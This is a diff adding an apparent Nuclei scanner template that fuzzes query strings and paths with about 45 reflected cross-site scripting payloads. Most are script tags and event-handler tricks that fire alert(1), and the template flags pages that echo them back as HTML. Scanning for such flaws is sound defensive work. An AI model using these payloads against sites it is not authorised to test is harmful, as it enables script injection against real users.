@@ -1,0 +1,90 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<div draggable=\"true\" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>"
+        - "<aside id=x tabindex=1 onbeforedeactivate=alert(1)></aside><input autofocus>"
+        - "<iframe srcdoc=\"<script>alert(1)</script>\">"
+        - "<del oncopy=\"alert(1)\" contenteditable>test</del>"
+        - "<time onkeypress=\"alert(1)\" contenteditable>test</time>"
+        - "<svg/onload=alert(1)>"
+        - "<form id=x tabindex=1 onbeforedeactivate=alert(1)></form><input autofocus>"
+        - "<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>"
+        - "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><source id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></source>"
+        - "<frame id=x tabindex=1 ondeactivate=alert(1)></frame><input id=y autofocus>"
+        - "<menu id=x tabindex=1 ondeactivate=alert(1)></menu><input id=y autofocus>"
+        - "<style>:target {color:red;}</style><input id=x style=\"transition:color 1s\" ontransitionrun=alert(1)>"
+        - "<time id=x tabindex=1 onfocusin=alert(1)></time>"
+        - "<plaintext draggable=\"true\" ondragend=\"alert(1)\">test</plaintext>"
+        - "<svg><img src=xxx:x onloadend=\"alert(1)\"></svg>"
+        - "<style>:target {color:red;}</style><object id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></object>"
+        - "<script>alert(1)</script>"
+        - "<blink draggable=\"true\" ondragend=\"alert(1)\">test</blink>"
+        - "<output id=x tabindex=1 onactivate=alert(1)></output><input autofocus>"
+        - "<script>alert(1)</script>"
+        - "<script>alert(1)</script"
+        - "<div draggable=\"true\" contenteditable>drag me</div><menuitem ondragover=alert(1) contenteditable>drop here</menuitem>"
+        - "<menuitem onbeforepaste=\"alert(1)\" contenteditable>test</menuitem>"
+        - "<style>:target {color:red;}</style><tfoot id=x style=\"transition:color 1s\" ontransitionend=alert(1)></tfoot>"
+        - "<canvas draggable=\"true\" ondragenter=\"alert(1)\">test</canvas>"
+        - "<marquee id=x tabindex=1 ondeactivate=alert(1)></marquee><input id=y autofocus>"
+        - "<audio id=x tabindex=1 ondeactivate=alert(1)></audio><input autofocus>"
+        - "<basefont draggable=\"true\" ondragend=\"alert(1)\">test</basefont>"
+        - "<multicol id=x tabindex=1 onbeforeactivate=alert(1)></multicol>"
+        - "<applet draggable=\"true\" ondragend=\"alert(1)\">test</applet>"
+        - "&lt;SCRIPT&gt;javascript:alert(&quot;XSS&quot;)"
+        - "<SCRIPT>alert(\"XSS\");</SCRIPT>"
+        - "<canvas id=x tabindex=1 ondeactivate=alert(1)></canvas><input autofocus>"
+        - "<style>:target {color:red;}</style><label id=x style=\"transition:color 1s\" ontransitioncancel=alert(1)></label>"
+        - "<audio controls autoplay><source src=\"validaudio.wav\" type=\"audio/wav\"></audio>"
+        - "<audio autoplay controls onloadedmetadata=alert(1)></audio>"
+        - "<video controls autoplay><source src=\"validvideo.mp4\" type=video/mp4></video>"
+        - "<style>@keyframes slidein {}</style><thead style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></thead>"
+        - "<aside draggable=\"true\" ondragleave=\"alert(1)\">test</aside>"
+        - "<output onclick=\"alert(1)\">test</output>"
+        - "<svg draggable=\"true\" ondragend=\"alert(1)\">test</svg>"
+        - "<svg draggable=\"true\" ondragleave=\"alert(1)\">test</svg>"
+        - "<style>@keyframes x{}</style><optgroup style=\"animation-name:x\" onanimationstart=\"alert(1)\"></optgroup>"
+        - "<svg><h1 onload=alert(1)>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
